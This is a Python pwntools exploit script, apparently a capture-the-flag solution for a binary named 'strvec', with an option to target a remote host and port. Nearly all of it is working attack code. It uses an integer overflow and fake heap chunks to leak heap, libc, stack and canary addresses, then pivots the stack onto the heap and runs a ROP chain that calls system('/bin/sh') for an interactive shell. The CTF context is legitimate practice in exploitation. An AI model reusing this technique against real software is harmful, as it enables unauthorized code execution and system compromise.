#!/usr/bin/python
from pwn import *
import sys

LOCAL = True

HOST = "168.119.108.148"
PORT = 12010
PROCESS = "./strvec"

def get(idx):
    r.sendline("1")
    r.sendlineafter("= ", str(idx))
    r.recvuntil("-> ")
    resp = r.recvline()[:-1]
    r.recvuntil("> ")
    return resp

def set(idx, data):
    r.sendline("2")
    r.sendlineafter("= ", str(idx))

    if len(data) < 0x20:
        r.sendlineafter("= ", data)
    else:
        r.sendafter("= ", data)

def exploit(r):
    # put fake chunk size into name
    payload = p64(0) + p64(0x31)[:6]

    # integer overflow (create chunk with huge size able to overflow)
    r.sendlineafter(": ", payload)
    r.sendlineafter("n = ", str(0x20000020+(0x690/8)))
    r.recvuntil("> ")

    # create one entry
    set(0, "\x00")

    # create another entry inside of the chunk of entry 0
    set((0x555555559a40 - 0x5555555592a8)/8, "A")

    # can leak heap address now via entry 0
    HEAPLEAK = u64(get(0).ljust(8, "\x00"))

    log.info("HEAP       : %s" % hex(HEAPLEAK))
    
    # write address of vector to heap
    set(1, p64(HEAPLEAK - 0x7d0))  # 0x5555555592a0
    
    # free vector itself
    set((0x555555559aa0-0x5555555592a8)/8, "B")

    # allocate new entry inside of vector (will push libc address further)
    payload = p64(0x20000200)       # new size
    payload += p64(0x0)

    set(0, payload)

    # create a note entry pointing to libc address
    set(20, p64(HEAPLEAK - 0x770))    # 0x555555559300

    LIBCLEAK=u64(get(5).ljust(8, "\x00"))
    libc.address=LIBCLEAK - 96 - 0x10 - libc.symbols["__malloc_hook"]

    log.info("LIBC leak  : %s" % hex(LIBCLEAK))
    log.info("LIBC       : %s" % hex(libc.address))
    
    # create a note entry pointing to environ
    set(30, p64(libc.symbols["environ"]))

    STACK=u64(get((0x555555559300-0x5555555592a8)/8).ljust(8, "\x00"))

    log.info("STACK      : %s" % hex(STACK))

    # create a note entry pointing to return address
    set(31, p64(STACK - 0x118))  

    # create a note entry pointing to canary+1
    set(32, p64(STACK - 0x10f))  

    # leak canary
    CANARY=u64(("\x00"+get((0x555555559360-0x5555555592a8)/8)).ljust(8, "\x00"))

    log.info("CANARY     : %s" % hex(CANARY))
    
    # free "stack" note
    set((0x555555559330-0x5555555592a8)/8, "A")

    LEAVE=libc.address + 0x000000000005aa48
    POPRDI=libc.address + 0x0000000000026b72

    # put heap pivot payload into ret
    payload="A"*8
    payload += p64(CANARY)
    payload += p64(HEAPLEAK + 0xcc0-8)
    payload += p64(LEAVE)[:6]

    set(32, payload)

    # put ropchain on heap
    payload=p64(POPRDI)
    payload += p64(next(libc.search("/bin/sh")))
    payload += p64(libc.symbols["system"])

    set(100, payload)

    # fill up the heap to enlarge available stack for executing system
    for i in range(100):
        set(800+i, payload)

    # reallocate note chunk pointing to vector (will overwrite vector size with 0)
    # this way, no frees will happen on exit, no need to cleanup :)
    set(0, "AAAABBBB")

    r.sendlineafter("> ", "3")

    r.interactive()

    return


if __name__ == "__main__":
    # e = ELF("./strvec")
    libc=ELF("./libc-2.31.so")

    if len(sys.argv) > 1:
        LOCAL=False
        r=remote(HOST, PORT)
    else:
        LOCAL=True
        # r = process("./strvec")
        r=process("./strvec", env={"LD_PRELOAD": "./libc-2.31.so"})
        print(util.proc.pidof(r))
        pause()

    exploit(r)
